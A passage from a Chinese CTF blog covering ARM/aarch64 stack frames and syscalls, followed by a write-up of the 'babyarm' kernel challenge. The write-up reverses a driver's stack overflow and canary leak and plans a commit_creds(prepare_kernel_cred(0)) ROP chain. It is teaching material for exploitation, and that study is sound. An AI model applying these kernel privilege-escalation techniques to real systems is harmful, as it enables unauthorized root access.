<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x55000007c8</span> &lt;A+<span class="number">116</span>&gt;       nop    </span><br><span class="line">  <span class="number">0x55000007cc</span> &lt;A+<span class="number">120</span>&gt;       ldp    x29, x30, [sp], #<span class="number">0x40</span></span><br><span class="line">► <span class="number">0x55000007d0</span> &lt;A+<span class="number">124</span>&gt;       ret    </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5501811f50</span><span class="number">-0x40</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x5501811f10</span> —▸ <span class="number">0x5501811f50</span> —▸ <span class="number">0x5501811f80</span> —▸ <span class="number">0x5501812090</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x5501811f18</span> —▸ <span class="number">0x5500000838</span> (main+<span class="number">100</span>) ◂— adrp   x0, #<span class="number">0x5500000000</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>ldp  x29, x30, [sp]</code> 会恢复调用者 main 函数的 X29(FP)，X30(LD)</li>
<li>后面的 <code>#0x40</code> 会使 <code>sp+0x40</code></li>
</ul>
<p>函数 A 结束之后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X29  <span class="number">0x5501811f50</span> —▸ <span class="number">0x5501811f80</span> —▸ <span class="number">0x5501812090</span> ◂— <span class="number">0x0</span></span><br><span class="line">X30  <span class="number">0x5500000838</span> (main+<span class="number">100</span>) ◂— adrp   x0, #<span class="number">0x5500000000</span></span><br></pre></td></tr></table></figure>
<h2 id="ARM-的系统调用"><a href="#ARM-的系统调用" class="headerlink" title="ARM 的系统调用"></a>ARM 的系统调用</h2><p>先看两个 libc 函数触发 ARM 系统调用的源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">clone</span><span class="params">(<span class="keyword">int</span> (*func)(<span class="keyword">void</span>*),<span class="keyword">void</span> *child_stack,<span class="keyword">int</span> flags,<span class="keyword">void</span> *func_arg,....)</span></span>;</span><br></pre></td></tr></table></figure>
<p>32位 arm：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">ENTRY(__clone)</span><br><span class="line">	@ sanity check args</span><br><span class="line">	cmp	r0, #0 /* 检查第一个参数 */</span><br><span class="line">	@ align sp</span><br><span class="line">	and	r1, r1, #-8 /* 使child_stack对齐 */</span><br><span class="line">	ite	ne 		/* If-Then-Else接下来的两条指令条件执行(条件为:不相等) */</span><br><span class="line">	cmpne	r1, #0				/* If Then如果ne成立,执行cmp,不成立则该条不执行 */</span><br><span class="line">	moveq	r0, #-EINVAL		/* Else:如果eq成立,执行mov,不成立则该条不执行 */</span><br><span class="line">	beq	PLTJMP(syscall_error)	 /* 如果eq成立,执行beq,不成立则该条不执行 */</span><br><span class="line"></span><br><span class="line">	@ insert the args onto the new stack</span><br><span class="line">	str	r3, [r1, #-4]!</span><br><span class="line">	str	r0, [r1, #-4]!</span><br><span class="line"></span><br><span class="line">	@ do the system call</span><br><span class="line">	@ get flags</span><br><span class="line">	mov	r0, r2</span><br><span class="line">	mov	ip, r2</span><br><span class="line">	@ new sp is already in r1</span><br><span class="line">	push	&#123;r4, r7&#125;</span><br><span class="line">	cfi_adjust_cfa_offset (8)		/* 发出一个操作码,告诉调试器CFA与假定的CFA(sp)的偏移量为8 */</span><br><span class="line">	cfi_rel_offset (r4, 0)			/* 告诉调试器R4的原始值可以在新调整的CFA的偏移量0处找到 */</span><br><span class="line">	cfi_rel_offset (r7, 4)			/* 告诉调试器R7的原始值可以在新调整的CFA的偏移量4处找到 */</span><br><span class="line">	ldr	r2, [sp, #8]</span><br><span class="line">	ldr	r3, [sp, #12]</span><br><span class="line">	ldr	r4, [sp, #16]</span><br><span class="line">	ldr	r7, =SYS_ify(clone)			/* R7负责持有系统调用号 */</span><br><span class="line">	swi	0x0						   /* 触发异步异常 */</span><br><span class="line">	cfi_endproc						/* 定义函数结束 */</span><br><span class="line">	cmp	r0, #0</span><br><span class="line">	beq	1f</span><br><span class="line">	pop	&#123;r4, r7&#125;</span><br><span class="line">	blt	PLTJMP(C_SYMBOL_NAME(__syscall_error))</span><br><span class="line">	RETINSTR(, lr)</span><br><span class="line"></span><br><span class="line">	cfi_startproc</span><br><span class="line">PSEUDO_END (__clone)</span><br></pre></td></tr></table></figure>
<ul>
<li>系统调用会引起处理器模式切换 USER 切换到 SVC，而 SVC 下的 SP 和 USER 模式的 SP 是不同的</li>
<li>因此系统调用无法使用栈传入参数，需要将所有的参数通过寄存器 R0-R5 传递</li>
</ul>
<p>64位 aarch64：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">ENTRY(__clone)</span><br><span class="line">	/* Save args for the child.  */</span><br><span class="line">	mov	x10, x0</span><br><span class="line">	mov	x11, x2</span><br><span class="line">	mov	x12, x3</span><br><span class="line"></span><br><span class="line">	/* Sanity check args.  */</span><br><span class="line">	mov	x0, #-EINVAL</span><br><span class="line">	cbz	x10, .Lsyscall_error	/* 如果X10的值为&#x27;0&#x27;,则跳转Lsyscall_error */</span><br><span class="line">	cbz	x1, .Lsyscall_error		/* 如果X1的值为&#x27;0&#x27;,则跳转Lsyscall_error */</span><br><span class="line"></span><br><span class="line">	/* Do the system call.  */</span><br><span class="line">	/* X0:flags, x1:newsp, x2:parenttidptr, x3:newtls, x4:childtid.  */</span><br><span class="line">	mov	x0, x2                  /* flags  */</span><br><span class="line">	/* New sp is already in x1.  */</span><br><span class="line">	mov	x2, x4			/* ptid  */</span><br><span class="line">	mov	x3, x5			/* tls  */</span><br><span class="line">	mov	x4, x6			/* ctid  */</span><br><span class="line">	mov	x8, #SYS_ify(clone)</span><br><span class="line">	svc	0x0</span><br><span class="line"></span><br><span class="line">	cmp	x0, #0</span><br><span class="line">	beq	thread_start</span><br><span class="line">	blt	.Lsyscall_error</span><br><span class="line">	RET</span><br><span class="line">PSEUDO_END (__clone)</span><br></pre></td></tr></table></figure>
<ul>
<li>参数传递依靠 X0-X6</li>
</ul>
<p>svc 和 swi 都是 supervisor call 指令，都是系统调用：</p>
<ul>
<li>在 armv7 之前，用的都是 swi，触发异步异常，进入 <code>vector_swi</code> 异常向量表<ul>
<li>当异步异常产生后，程序会抛出一个信号使异常处理程序进入 CPU 的等待队列，然后由 CPU 在合适的时机去运行异常处理程序</li>
</ul>
</li>
<li>在 armv8-arch64 架构下，抛弃 swi 改用 svc，触发的是同步异常，进入同步异常向量表 <code>el1_sync</code><ul>
<li>当同步异常产生后，指令流会立刻进入异常处理流程，CPU 立刻执行异常处理程序</li>
</ul>
</li>
<li>如果不纠结 CPU 的处理过程，就可以把 swi 和 svc 当成是一回事，只是用的向量表不同而已</li>
</ul>
<p>当通过系统调用进入内核的时候，内核会进行一系列初始化操作，在内核栈上形成如下的用户空间现场： </p>
<img src="/2023/03/15/ARM%20pwn%20%E8%BF%9B%E9%98%B6%E7%9F%A5%E8%AF%86/750976682a217082e25cd506fb8c2501-1682921679590.png" class title="750976682a217082e25cd506fb8c2501"> 
<ul>
<li><code>pt_regs</code>：封装了需要在内核入口中保存的最少的状态信息，在系统崩溃时将会提供 debug 信息</li>
<li><code>thread_info</code>：存储当前进程的基本信息，包括进程描述符 <code>task_struct</code></li>
</ul>
<p>执行完具体的系统调用代码后，程序会依靠 <code>pt_regs</code> 的数据恢复用户态进程的上下文</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/14/ARM%20kernel%20pwn%E5%88%9D%E6%8E%A2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/14/ARM%20kernel%20pwn%E5%88%9D%E6%8E%A2/" class="post-title-link" itemprop="url">ARM kernel pwn初探</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-03-14 23:41:45" itemprop="dateCreated datePublished" datetime="2023-03-14T23:41:45+08:00">2023-03-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-04-30 17:59:37" itemprop="dateModified" datetime="2023-04-30T17:59:37+08:00">2023-04-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>9.5k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>babyarm 复现</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">timeout --foreground 60 qemu-system-aarch64 \</span><br><span class="line">    -m 128M \</span><br><span class="line">    -machine virt \</span><br><span class="line">    -cpu max \</span><br><span class="line">    -kernel ./Image \</span><br><span class="line">    -append &quot;console=ttyAMA0 loglevel=3 oops=panic panic=1&quot; \</span><br><span class="line">    -initrd ./rootfs.cpio \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -smp cores=1,threads=1 \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure>
<ul>
<li>没有给定<code>nokaslr</code>，默认开启地址随机化 </li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line"></span><br><span class="line">insmod /home/pwn/demo.ko</span><br><span class="line">chown -R 1000:1000 /home/pwn</span><br><span class="line"></span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/perf_event_paranoid</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line"></span><br><span class="line">cd /home/pwn</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line"></span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>
<ul>
<li>dmesg_restrict</li>
<li>kptr_restrict</li>
<li>perf_event_paranoid</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>IDA 分析内核模块发现就只有 <code>device_write</code> 和 <code>device_read</code> 有用，但这两个函数都很乱</p>
<p>再加上对 ARM 架构不熟悉，逆向的过程花费了我不少时间，下面是我的思考过程：</p>
<p>函数 <code>device_write</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 v21; <span class="comment">// [xsp+B8h] [xbp+B8h]</span></span><br><span class="line"></span><br><span class="line">StatusReg = _ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">v21 = *(_QWORD *)(StatusReg + <span class="number">0x480</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>从位置上开看 v21 应该是 canary</li>
<li>那前面的 <code>_ReadStatusReg(ARM64_SYSREG(3, 0, 4, 1, 0))</code> 就是用来生成 canary 的</li>
</ul>
<p>然后就到了我感觉最抽象的一段代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (*(_DWORD *)(StatusReg + <span class="number">0x2C</span>) &amp; <span class="number">0x200000</span>) != <span class="number">0</span></span><br><span class="line">  || (v19 = *(_QWORD *)StatusReg, v8 = (<span class="keyword">unsigned</span> __int64)buf, (v19 &amp; <span class="number">0x4000000</span>) != <span class="number">0</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v8 = (<span class="keyword">unsigned</span> __int64)buf &amp; ((__int64)((_QWORD)buf &lt;&lt; <span class="number">8</span>) &gt;&gt; <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line">v9 = <span class="number">0xFFFFFFFFFFFF</span>LL;</span><br><span class="line">_CF = __CFADD__(v8, len);</span><br><span class="line">v11 = v8 + len;</span><br><span class="line"><span class="keyword">if</span> ( v11 != <span class="number">0</span> &amp;&amp; _CF )</span><br><span class="line">  v9 = <span class="number">0LL</span>;                                   <span class="comment">// △</span></span><br><span class="line"><span class="keyword">if</span> ( _CF )</span><br><span class="line">  v11 = <span class="number">-1LL</span>;</span><br><span class="line"><span class="keyword">if</span> ( (v11 != v9 + !_CF) &amp; __CFSUB__(v11, v9, _CF) )</span><br><span class="line">  v12 = <span class="number">0LL</span>;</span><br><span class="line"><span class="keyword">else</span>                                          <span class="comment">// △</span></span><br><span class="line">  v12 = <span class="number">1LL</span>;</span><br><span class="line"><span class="keyword">if</span> ( v12 )                                    <span class="comment">// △</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( ((<span class="keyword">unsigned</span> __int64)buf &amp; ((__int64)((_QWORD)buf &lt;&lt; <span class="number">8</span>) &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFFFF000000000000</span>LL) != <span class="number">0</span> )</span><br><span class="line">    v13 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v13 = buf;</span><br><span class="line">  __asm &#123; HINT            #<span class="number">0x14</span> &#125;</span><br><span class="line">  v17 = _arch_copy_from_user(demo_buf, v13, len);<span class="comment">// 成功返回&#x27;0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v17 = len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v17 )                                    <span class="comment">// △</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;demo_buf[len - v17], <span class="number">0</span>, v17);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;                <span class="comment">// 返回错误码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  _memcpy(tmp, demo_buf);</span><br><span class="line">  <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>demo_buf</code> 的范围远比 <code>tmp</code> 大，因此有栈溢出</li>
</ul>
<p>这段代码有很多未命名变量，宏定义，还有很多 if-else 语句，但我们可以从后向前分析：</p>
<ul>
<li>为了不让程序返回错误码 0xFFFFFFFFFFFFFFEALL，以上各个 if-else 语句都只能按照 “△” 标注的路线回溯</li>
<li>直到第一个 if 执行：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (*(_DWORD *)(StatusReg + <span class="number">0x2C</span>) &amp; <span class="number">0x200000</span>) != <span class="number">0</span></span><br><span class="line">    || (v19 = *(_QWORD *)StatusReg, </span><br><span class="line">        v8 = (<span class="keyword">unsigned</span> __int64)buf, </span><br><span class="line">        (v19 &amp; <span class="number">0x4000000</span>) != <span class="number">0</span>) )</span><br></pre></td></tr></table></figure>
<p>感觉程序在检查一些环境，没有实质性的操作，写一个 test.c 进行调试：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_sp_v;</span><br><span class="line"><span class="keyword">size_t</span> *user_sp = &amp;user_sp_v;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> buf[<span class="number">0x200</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/demo&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    write(fd, buf, <span class="number">0x200</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>可以通过 <code>/sys/module/demo/sections/.text</code> 获取模块 <code>.text</code> 基地址</li>
</ul>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/home/</span>pwn # cat <span class="regexp">/sys/m</span>odule<span class="regexp">/demo/</span>sections/.text</span><br><span class="line"><span class="number">0</span>xffffbcf41c9e3000</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0xffffbe24d4559090</span>    bl     #<span class="number">0xffffbe24da88b200</span>           &lt;<span class="number">0xffffbe24da88b200</span>&gt;</span><br><span class="line">   ↓</span><br><span class="line">  <span class="number">0xffffbe24da88b200</span>    hint   #<span class="number">0x22</span></span><br><span class="line">  <span class="number">0xffffbe24da88b204</span>    add    x5, x0, x2</span><br><span class="line">  <span class="number">0xffffbe24da88b208</span>    mov    x15, x1</span><br><span class="line">  <span class="number">0xffffbe24da88b20c</span>    mov    x6, x0</span><br><span class="line">  <span class="number">0xffffbe24da88b210</span>    cmp    x2, #<span class="number">0x10</span></span><br></pre></td></tr></table></figure>
<ul>
<li>其实到 <code>_arch_copy_from_user(demo_buf, v13, len)</code> 执行之前的操作都没有什么影响，可以直接忽略</li>
</ul>
<p>函数 <code>device_read</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">canary = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>)) + <span class="number">0x480</span>);</span><br><span class="line"><span class="keyword">if</span> ( length &gt; <span class="number">0x1000</span> )</span><br><span class="line">  <span class="keyword">return</span> device_read_0((file *)length, buffer, length, <span class="number">0LL</span>);</span><br><span class="line">_memcpy(demo_buf, tmp);</span><br><span class="line">StatusReg = _ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line"><span class="keyword">if</span> ( (*(_DWORD *)(StatusReg + <span class="number">44</span>) &amp; <span class="number">0x200000</span>) != <span class="number">0</span></span><br><span class="line">  || (v7 = (<span class="keyword">unsigned</span> __int64)buffer, (*(_QWORD *)StatusReg &amp; <span class="number">0x4000000</span>) != <span class="number">0</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v7 = (<span class="keyword">unsigned</span> __int64)buffer &amp; ((__int64)((_QWORD)buffer &lt;&lt; <span class="number">8</span>) &gt;&gt; <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line">v8 = <span class="number">0xFFFFFFFFFFFF</span>LL;</span><br><span class="line">_CF = __CFADD__(v7, length);</span><br><span class="line">v10 = v7 + length;</span><br><span class="line"><span class="keyword">if</span> ( v10 != <span class="number">0</span> &amp;&amp; _CF )</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line"><span class="keyword">if</span> ( _CF )</span><br><span class="line">  v10 = <span class="number">-1LL</span>;</span><br><span class="line"><span class="keyword">if</span> ( (v10 != v8 + !_CF) &amp; __CFSUB__(v10, v8, _CF) )</span><br><span class="line">  v11 = <span class="number">0LL</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  v11 = <span class="number">1LL</span>;</span><br><span class="line">v12 = length;</span><br><span class="line"><span class="keyword">if</span> ( v11 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( ((<span class="keyword">unsigned</span> __int64)buffer &amp; ((__int64)((_QWORD)buffer &lt;&lt; <span class="number">8</span>) &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFFFF000000000000</span>LL) != <span class="number">0</span> )</span><br><span class="line">    v15 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v15 = buffer;</span><br><span class="line">  __asm &#123; HINT            #<span class="number">0x14</span> &#125;</span><br><span class="line">  v12 = _arch_copy_to_user(v15, demo_buf, length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>由于 tmp 和 canary 靠得很近，这里可以把 canary 拷贝到 demo_buf 中</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>栈溢出和泄露 canary 都很简单，关键是怎么提取并且回到用户态</p>
<p>程序开了 smep 因此只能写 ROP，第一个 gadget 需要完成栈迁移的工作</p>
<p>常规获取 gadget 的工具 ropper/ROPgadget 不能使用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filebytes.binary.BinaryError: Bad architecture</span><br><span class="line">ropper --file ./Image --nocolor &gt; g1  <span class="number">0.40</span>s user <span class="number">0.09</span>s system <span class="number">99</span>% cpu <span class="number">0.491</span> total</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Error] PE.getArch() - Bad Arch</span><br></pre></td></tr></table></figure>
<ul>
<li>这就需要手动找 Gadget 了</li>
</ul>
<p>内核里有个好用的 gadget：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000016950 00 00 80 52                   MOV             W0, #0</span><br><span class="line">.text:0000000000016954 F3 53 41 A9                   LDP             X19, X20, [SP,#0x50+var_40]</span><br><span class="line">.text:0000000000016958 F5 5B 42 A9                   LDP             X21, X22, [SP,#0x50+var_30]</span><br><span class="line">.text:000000000001695C F7 63 43 A9                   LDP             X23, X24, [SP,#0x50+var_20]</span><br><span class="line">.text:0000000000016960 F9 23 40 F9                   LDR             X25, [SP,#0x50+var_10]</span><br><span class="line">.text:0000000000016964 FD 7B C5 A8                   LDP             X29, X30, [SP+0x50+var_50],#0x50</span><br><span class="line">.text:0000000000016968 C0 03 5F D6                   RET</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里有一个小坑需要注意：ARM 的 ret 指令和 x86 的有很大不同</p>
<ul>
<li>执行 ret 之后，会把 LR 寄存器里的值赋值给 PC（注意，不是栈）</li>
</ul>
<p>因此构造 ROP 链时的核心就是通过栈来控制 LR(X30) 寄存器：</p>
<ul>
<li>控制 X19 为 <code>prepare_kernel_cred+4</code></li>
<li>控制 X30 为 <code>commit_creds+4</code></li>
<li>执行 ret 时就可以执行 <code>commit_creds(prepare_kernel_cred(0))</code></li>
</ul>
<p>后续需要考虑返回用户态的问题：</p>
<p>ARM64使用 <code>SVC</code> 指令进入内核态，使用 <code>ERET</code> 指令返回用户态，ARM 在进入内核态之前会保存用户态所有寄存器状态，在返回时恢复</p>
<p>其中比较重要的寄存器有 SP_EL0、ELR_EL1、SPSR_EL1：</p>
<ul>
<li>SP_EL0：保存用户态的栈指针</li>
